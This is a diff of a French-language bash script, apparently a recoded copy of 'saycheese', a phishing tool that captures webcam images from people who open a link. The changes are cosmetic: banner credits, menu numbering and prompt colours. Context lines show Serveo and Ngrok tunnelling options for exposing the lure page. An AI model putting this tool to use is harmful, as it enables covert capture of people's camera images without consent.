@@ -1,7 +1,8 @@
 #!/bin/bash
-# coder par: github.com/thelinuxchoice/saycheese
+# 
 # Si vous utilisez une partie de ce code, donnez-moi les crédits. Lisez la licence!
 
+clear
 trap 'printf "\n";arret' 2
 logo_peche() {
 printf "\e[0;35m╭━━━╮\e[0m\e[0;31m╱╱╱╱╱\e[0m\e[0;35m╭╮         \e[0m\n"
@@ -10,7 +11,8 @@ printf "\e[0;35m┃╰━╯┣━━┳━━┫╰━┳━━╮             
 printf "\e[0;35m┃╭━━┫┃━┫╭━┫╭╮┃┃━┫                          \e[0m\n"
 printf "\e[0;35m┃┃\e[0m\e[0;31m╱╱\e[0m\e[0;35m┃┃━┫╰━┫┃┃┃┃━┫\e[0m\n"
 printf "\e[0;35m╰╯\e[0m\e[0;31m╱╱\e[0m\e[0;35m╰━━┻━━┻╯╰┻━━╯\e[37m🅅2.0\e[0m\n"
-printf " \e[37m Recoded by \e[36mFaxel \e[0m \n\n"
+printf " \e[37m Coded by  \e[31m: \e[34mgithub.com/thelinuxchoice/saycheese\e[0m\n"
+printf " \e[37m Recoded by \e[38;5;214mFaxel \e[0m \n"
 }
 arret() {
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
@@ -126,10 +128,10 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 Serveur_par_default="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choisissez une option de redirection de port : \e[0m' option_serveur
+read -p $'\n\e[1;91m[\e[0m\e[1;73m+\e[0m\e[1;91m]\e[1;97m Choisissez une option de redirection de port \e[1;91m: \e[1;97m \e[0m' option_serveur
 option_serveur = "${option_serveur:-${Serveur_par_default}}"
 if [[ $option_serveur -eq 1 ]]; then
 command -v php > /dev/null 2>&1 || { echo >&2 "J'ai besoin de ssh mais il n'est pas installé.\nInstallez-le  pip2 install ssh et relancez."; exit 1; }
